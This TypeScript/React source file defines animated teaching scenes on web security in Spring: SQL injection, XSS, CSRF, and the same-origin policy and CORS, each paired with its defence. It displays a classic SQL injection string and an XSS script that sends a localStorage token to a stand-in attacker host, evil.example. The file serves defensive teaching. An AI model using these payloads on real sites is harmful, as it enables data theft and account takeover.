// Spring Part 15 scenes (web attacks): input turning into SQL, a script in a
// comment stealing a token, a forged form riding the bank's cookie, and the
// browser's CORS preflight.
// Widths only, never heights; the top-right corner stays free for the term card.
import { C, MONO } from "../lib/theme.ts";
import { ease, enter, pop, rise } from "../lib/anim.ts";
import { Abs, card, Chip } from "./ui.tsx";
import { at, Big, clamp01 } from "./custom3.tsx";
import { Actor, type CP, Packet, Svg } from "./secui.tsx";

// ------------------------------------------------------------------ SQL injection

export const SqlInject = ({ t }: CP) => {
  const f = t.frame;
  const typed = "' OR '1'='1";
  const n = t.step >= 1 ? Math.floor(clamp01((f - at(t, 1) - 10) / 40) * typed.length) : 0;
  const users = ["asha@x.in", "ravi@x.in", "neha@x.in", "admin@x.in", "dev@x.in"];
  return (
    <>
      <Abs x={160} y={260} w={1600} style={{ fontSize: 26, color: C.muted, ...rise(f, 4) }}>search endpoint · input: email</Abs>
      {t.step < 2 && (
        <div style={{ opacity: 1 - (t.step >= 2 ? 1 : 0) }}>
          <Abs x={160} y={320} w={1600} style={{ ...card(t.step >= 1 ? C.red : C.line), padding: "22px 28px", fontFamily: MONO, fontSize: 32, ...rise(f, 10) }}>
            SELECT * FROM users WHERE email = '<span style={{ color: t.step >= 1 ? C.red : C.amber }}>{t.step >= 1 ? typed.slice(0, n) : "asha@x.in"}</span>'
          </Abs>
          {t.step >= 1 && n >= typed.length && (
            <Abs x={160} y={480} w={1600} style={{ ...rise(f, at(t, 1) + 55) }}>
              <div style={{ fontSize: 28, color: C.red, fontWeight: 800 }}>'1'='1' is always true → every row comes back</div>
              <div style={{ display: "flex", gap: 12, marginTop: 16, flexWrap: "wrap" }}>
                {users.map((u, i) => (
                  <div key={u} style={{ ...card(C.red), padding: "8px 16px", fontFamily: MONO, fontSize: 24, opacity: Math.min(1, pop(f, at(t, 1) + 65 + i * 6)) }}>{u}</div>
                ))}
              </div>
            </Abs>
          )}
        </div>
      )}
      {t.step >= 2 && (
        <>
          <Abs x={160} y={320} w={1000} style={{ ...card(C.green), padding: "22px 28px", fontFamily: MONO, fontSize: 30, ...rise(f, at(t, 2)) }}>
            SELECT * FROM users WHERE email = <span style={{ color: C.green }}>?</span>
            <div style={{ fontSize: 22, color: C.muted, marginTop: 8, fontFamily: "inherit" }}>1. the query shape is sent and parsed first</div>
          </Abs>
          <Abs x={1220} y={320} w={540} style={{ ...card(C.amber), padding: "22px 28px", ...rise(f, at(t, 2) + 40) }}>
            <div style={{ fontFamily: MONO, fontSize: 30, color: C.amber }}>"{typed}"</div>
            <div style={{ fontSize: 22, color: C.muted, marginTop: 8 }}>2. sent separately: data, never code</div>
          </Abs>
          <Abs x={160} y={520} w={1600} style={{ fontSize: 28, ...rise(f, at(t, 2) + 80) }}>
            result: <span style={{ color: C.green, fontWeight: 800 }}>0 rows</span> · it's just an odd email address
          </Abs>
        </>
      )}
      {t.step >= 3 && (
        <Abs x={160} y={640} w={1600} style={{ display: "flex", gap: 14, flexWrap: "wrap", ...rise(f, at(t, 3)) }}>
          <Chip color={C.green} style={{ fontSize: 24 }}>safe: findByEmail(email), JPQL :email</Chip>
          <Chip color={C.red} style={{ fontSize: 24 }}>unsafe: "..." + input inside @Query / createNativeQuery</Chip>
          <Chip color={C.amber} style={{ fontSize: 24 }}>ORDER BY column → allowlist</Chip>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ XSS: a script in a comment

export const Xss = ({ t }: CP) => {
  const f = t.frame;
  const escaped = t.step >= 3;
  return (
    <>
      <Abs x={160} y={260} w={860} style={{ ...card(C.line), padding: "20px 26px", ...rise(f, 4) }}>
        <div style={{ fontSize: 26, fontWeight: 800 }}>⭐ product reviews</div>
        <div style={{ fontSize: 24, color: C.muted, marginTop: 12, padding: "10px 0", borderTop: `1px solid ${C.line}` }}>“Great phone, battery lasts two days.”</div>
        {t.step >= 1 && (
          <div style={{ fontFamily: MONO, fontSize: 22, marginTop: 4, padding: "10px 0", borderTop: `1px solid ${C.line}`, color: escaped ? C.muted : C.red, ...rise(f, at(t, 1)) }}>
            {escaped ? "&lt;script&gt;fetch('https://evil…' + localStorage…)&lt;/script&gt;" : "<script>fetch('https://evil…' + localStorage.getItem('token'))</script>"}
          </div>
        )}
        {escaped && <div style={{ fontSize: 22, color: C.green, marginTop: 8, ...rise(f, at(t, 3) + 20) }}>escaped: shown as text, never run</div>}
      </Abs>
      {t.step >= 1 && t.step < 3 && (
        <>
          {[0, 1, 2].map((i) => (
            <Actor key={i} x={1200 + i * 220} y={270} w={190} icon="🧑" name={`viewer ${i + 1}`} color={f > at(t, 1) + 40 + i * 10 ? C.red : C.line} style={{ opacity: enter(f, at(t, 1) + 20 + i * 8) }} />
          ))}
          <Abs x={1120} y={470} w={680} style={{ fontSize: 26, color: C.red, fontWeight: 700, ...rise(f, at(t, 1) + 60) }}>
            the script runs inside your site, for every viewer
          </Abs>
        </>
      )}
      {t.step === 2 && (
        <>
          <Packet f={f} start={at(t, 2) + 20} x1={1300} x2={1600} y={600} label="🔑 token from localStorage" color={C.red} w={420} />
          <Abs x={1440} y={700} w={340} style={{ textAlign: "center", fontSize: 26, ...rise(f, at(t, 2) + 50) }}>😈 evil.example</Abs>
          <Abs x={160} y={600} w={860} style={{ ...card(C.green), padding: "16px 22px", fontSize: 26, ...rise(f, at(t, 2) + 70) }}>
            an HttpOnly cookie can't be read by JavaScript, so it can't be stolen this way
          </Abs>
        </>
      )}
      {t.step >= 3 && (
        <Abs x={1120} y={270} w={680} style={{ display: "flex", flexDirection: "column", gap: 14, ...rise(f, at(t, 3) + 30) }}>
          <div style={{ ...card(C.green), padding: "14px 20px", fontSize: 26 }}>escape output: th:text, React {"{value}"}</div>
          <div style={{ ...card(C.blue), padding: "14px 20px", fontSize: 26, fontFamily: MONO }}>Content-Security-Policy: script-src 'self'</div>
        </Abs>
      )}
      {t.step >= 4 && (
        <Abs x={160} y={760} w={1600} style={{ ...rise(f, at(t, 4)) }}>
          <Chip color={C.amber} style={{ fontSize: 24 }}>HttpOnly stops token theft, not XSS itself: the script can still send requests</Chip>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ CSRF: a forged form riding the cookie

export const Csrf = ({ t }: CP) => {
  const f = t.frame;
  const X = { browser: 300, evil: 960, bank: 1620 };
  const blocked = t.step >= 2;
  return (
    <>
      <Actor x={X.browser} icon="🌐" name="browser" sub="logged in to the bank" color={C.blue} style={rise(f, 4)} />
      <Actor x={X.evil} icon="😈" name="evil.example" sub="attacker's page" color={C.red} style={rise(f, 10)} />
      <Actor x={X.bank} icon="🏦" name="bank.example" sub="trusts the cookie" color={C.green} style={rise(f, 16)} />
      <Svg>
        {Object.values(X).map((x) => (
          <line key={x} x1={x} y1={390} x2={x} y2={900} stroke={C.line} strokeWidth={3} strokeDasharray="6 10" />
        ))}
      </Svg>
      <Abs x={X.browser - 140} y={410} w={280} style={{ ...card(C.amber), padding: "6px 0", textAlign: "center", fontFamily: MONO, fontSize: 22, ...rise(f, 20) }}>🍪 SESSION=abc</Abs>
      {t.step >= 1 && (
        <>
          <Packet f={f} start={at(t, 1)} x1={X.browser} x2={X.evil} y={470} label="visits the page" color={C.muted} w={300} />
          <Packet f={f} start={at(t, 1) + 40} x1={X.evil} x2={X.browser} y={530} label="hidden form, auto-submit" color={C.red} w={360} />
          <Packet
            f={f}
            start={at(t, 1) + 80}
            x1={X.browser}
            x2={X.bank}
            y={590}
            label={
              <>
                POST /transfer 🍪{blocked && <span style={{ color: C.red }}> · no token</span>}
              </>
            }
            color={C.red}
            w={460}
          />
          <Packet f={f} start={at(t, 1) + 120} x1={X.bank} x2={X.browser} y={650} label={blocked ? "403 Forbidden" : "200 OK: money moved"} color={blocked ? C.green : C.red} w={360} />
        </>
      )}
      {t.step === 1 && (
        <Abs x={X.browser + 40} y={730} w={1200} style={{ fontSize: 26, color: C.amber, ...rise(f, at(t, 1) + 90) }}>
          the browser attached the bank's cookie by itself: the attacker never saw it
        </Abs>
      )}
      {t.step >= 2 && (
        <Abs x={160} y={770} w={1600} style={{ display: "flex", gap: 14, flexWrap: "wrap", ...rise(f, at(t, 2) + 20) }}>
          <Chip color={C.green} style={{ fontSize: 24 }}>CSRF token: evil.example can't read it</Chip>
          {t.step >= 3 && <Chip color={C.green} style={{ fontSize: 24 }}>SameSite=Lax cookie</Chip>}
          {t.step >= 4 && <Chip color={C.blue} style={{ fontSize: 24 }}>Authorization: Bearer header → never auto-sent → safe to disable CSRF</Chip>}
        </Abs>
      )}
      {t.step >= 5 && (
        <Abs x={160} y={895} w={1600} style={{ fontSize: 26, color: C.red, fontWeight: 700, ...rise(f, at(t, 5)) }}>
          but a JWT stored in a cookie is sent automatically again → keep CSRF protection
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ origins and the same-origin policy

export const Origins = ({ t }: CP) => {
  const f = t.frame;
  const rows: [string, string, boolean][] = [
    ["https://app.example", "https://app.example/api", true],
    ["https://app.example", "https://api.example", false],
    ["http://localhost:3000", "http://localhost:8080", false],
  ];
  return (
    <>
      <Abs x={160} y={260} w={1600} style={{ fontSize: 30, fontWeight: 800, ...rise(f, 4) }}>origin = scheme + host + port</Abs>
      {rows.map(([a, b, same], i) => (
        <Abs key={i} x={160} y={340 + i * 100} w={1600} style={{ display: "flex", gap: 24, alignItems: "center", fontFamily: MONO, fontSize: 28, opacity: Math.min(1, pop(f, 14 + i * 16)) }}>
          <span style={{ width: 520 }}>{a}</span>
          <span style={{ color: C.muted }}>→</span>
          <span style={{ width: 560 }}>{b}</span>
          <span style={{ color: same ? C.green : C.red, fontFamily: "inherit" }}>{same ? "same origin" : "different origin"}</span>
        </Abs>
      ))}
      {t.step >= 1 && (
        <Abs x={160} y={680} w={1600} style={{ ...rise(f, at(t, 1)) }}>
          <Big size={38}>same-origin policy: a page may send to another origin, but not read the answer</Big>
          <div style={{ fontSize: 28, color: C.muted, marginTop: 14 }}>CORS is how that other origin says “you may read it”</div>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ the preflight

export const Preflight = ({ t }: CP) => {
  const f = t.frame;
  const X = { b: 420, s: 1500 };
  return (
    <>
      <Actor x={X.b} icon="🌐" name="browser" sub="page from app.example" color={C.blue} style={rise(f, 4)} />
      <Actor x={X.s} icon="🖥️" name="api.example" sub="Spring CorsFilter" color={C.green} style={rise(f, 10)} />
      <Svg>
        {[X.b, X.s].map((x) => (
          <line key={x} x1={x} y1={390} x2={x} y2={880} stroke={C.line} strokeWidth={3} strokeDasharray="6 10" />
        ))}
      </Svg>
      <Packet f={f} start={20} x1={X.b} x2={X.s} y={430} label="OPTIONS /orders · Origin · wants PUT + Authorization" color={C.amber} w={700} />
      {t.step >= 1 && <Packet f={f} start={at(t, 1)} x1={X.s} x2={X.b} y={520} label="204 · Allow-Origin: https://app.example" color={C.green} w={620} />}
      {t.step >= 2 && <Packet f={f} start={at(t, 2)} x1={X.b} x2={X.s} y={610} label="PUT /orders · Authorization: Bearer …" color={C.blue} w={620} />}
      {t.step >= 2 && <Packet f={f} start={at(t, 2) + 40} x1={X.s} x2={X.b} y={700} label="200 + Allow-Origin → JS may read it" color={C.green} w={620} />}
      {t.step >= 3 && (
        <Abs x={160} y={800} w={1600} style={{ display: "flex", gap: 14, flexWrap: "wrap", ...rise(f, at(t, 3)) }}>
          <Chip color={C.red} style={{ fontSize: 24 }}>preflight has no credentials → configure http.cors() or it gets 401</Chip>
          <Chip color={C.amber} style={{ fontSize: 24 }}>Allow-Origin * cannot go with credentials</Chip>
        </Abs>
      )}
    </>
  );
};

// ------------------------------------------------------------------ CORS does not protect the API

export const NotProtect = ({ t }: CP) => {
  const f = t.frame;
  const go = ease(f, 30, 30);
  return (
    <>
      <Actor x={420} icon="💻" name="curl / a server" sub="no browser, no CORS" color={C.red} style={rise(f, 4)} />
      <Actor x={1500} icon="🖥️" name="api.example" color={C.green} style={rise(f, 10)} />
      <Packet f={f} start={30} x1={420} x2={1500} y={470} label="PUT /orders" color={C.red} w={320} />
      <Abs x={160} y={600} w={1600} style={{ textAlign: "center", opacity: go, ...rise(f, 60) }}>
        <Big size={42}>CORS only tells browsers who may read. it never stops a request.</Big>
        <div style={{ fontSize: 30, color: C.muted, marginTop: 16 }}>authentication and authorization protect the API</div>
      </Abs>
      {t.step >= 1 && (
        <Abs x={160} y={820} w={1600} style={{ textAlign: "center", ...rise(f, at(t, 1)) }}>
          <Chip color={C.amber} style={{ fontSize: 26 }}>a forged form POST needs no preflight: CORS is not a CSRF defence</Chip>
        </Abs>
      )}
    </>
  );
};
